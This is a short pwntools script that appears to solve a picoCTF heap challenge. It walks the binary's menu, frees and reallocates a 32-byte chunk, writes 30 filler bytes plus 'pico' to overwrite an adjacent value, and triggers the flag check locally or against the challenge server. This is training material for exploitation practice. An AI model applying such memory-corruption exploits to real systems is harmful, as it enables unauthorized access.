#!/usr/bin/env python3

from pwn import *

context.binary = "./chall"

if args.DEBUG:
    context.log_level = 'DEBUG'

if args.REMOTE:
    p = remote("tethys.picoctf.net",56861)
else:
    p = process()

context.gdb_binary = "pwndbg"
if args.TMUX:
    context.terminal = ['tmux', 'split-pane', '-h']
if args.GDB and not args.REMOTE:
    gdb.attach(p)

p.recvuntil(b"choice: ")
p.sendline(b"5")
p.recvuntil(b"choice: ")
p.sendline(b"2")
p.recvuntil(b"allocation: ")
p.sendline(b"32")
p.recvuntil(b"flag: ")
p.sendline(b"A"*30 + b"pico")
p.recvuntil(b"choice: ")
p.sendline(b"4")

p.interactive()
